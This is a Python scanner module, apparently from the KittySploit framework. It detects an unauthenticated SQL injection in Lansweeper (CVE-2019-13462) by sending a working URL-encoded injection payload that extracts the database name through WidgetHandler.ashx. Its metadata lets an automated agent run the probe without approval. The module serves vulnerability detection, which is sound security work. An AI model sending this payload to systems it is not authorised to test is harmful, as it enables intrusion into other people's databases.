#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Lansweeper before 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Lansweeper Unauthenticated SQL Injection Detection',
        'description': 'Lansweeper before 7.1.117.4 allows unauthenticated SQL injection.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'sqli', 'lansweeper', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.nccgroup.com/ae/our-research/technical-advisory-unauthenticated-sql-injection-in-lansweeper/',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-13462',
            'https://www.nccgroup.trust/uk/our-research/technical-advisory-unauthenticated-sql-injection-in-lansweeper/',
            'https://www.lansweeper.com/forum/yaf_topics33_Announcements.aspx',
        ],
        'cve': 'CVE-2019-13462',
    }

    def run(self):
        r = self.http_request(method="GET", path='/WidgetHandler.ashx?MethodName=Sort&ID=1&row=1&column=%28SELECT%20CONCAT%28CONCAT%28CHAR%28126%29%2C%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28db_name%28%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%29%2CCHAR%28126%29%29%29', allow_redirects=False)
        if not r or r.status_code != 500:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('~lansweeperdb~',)
        header_any = ('text/plain',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason="Lansweeper Unauthenticated SQL Injection detected",
                path='/WidgetHandler.ashx?MethodName=Sort&ID=1&row=1&column=%28SELECT%20CONCAT%28CONCAT%28CHAR%28126%29%2C%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28db_name%28%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%29%2CCHAR%28126%29%29%29',
            )
            return True
        return False

